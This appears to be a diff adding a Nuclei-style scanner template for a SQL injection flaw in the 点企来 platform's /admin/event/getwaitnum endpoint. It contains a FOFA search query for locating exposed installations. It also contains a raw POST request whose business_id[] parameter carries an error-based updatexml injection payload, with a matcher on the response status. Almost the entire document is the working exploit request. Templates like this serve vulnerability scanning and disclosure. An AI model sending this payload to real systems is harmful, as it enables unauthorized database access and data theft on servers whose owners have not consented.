@@ -1,0 +1,29 @@
+id: poc-kdt8sogsflvkdgek
+info:
+  name: 点企来-getwaitnum 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kdt8sogsflvkdgek'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kdt8sogsflvkdgek
+    fofa: '"platform/passport/login.html" || body="platform/passport/sendsms.html"||body="admin_id: admin_id"'
+http:
+- raw:
+  - 'POST /admin/event/getwaitnum HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Type:application/x-www-form-urlencoded
+
+    Content-Length: 86
+
+    business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(123456)),1)&groupid=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
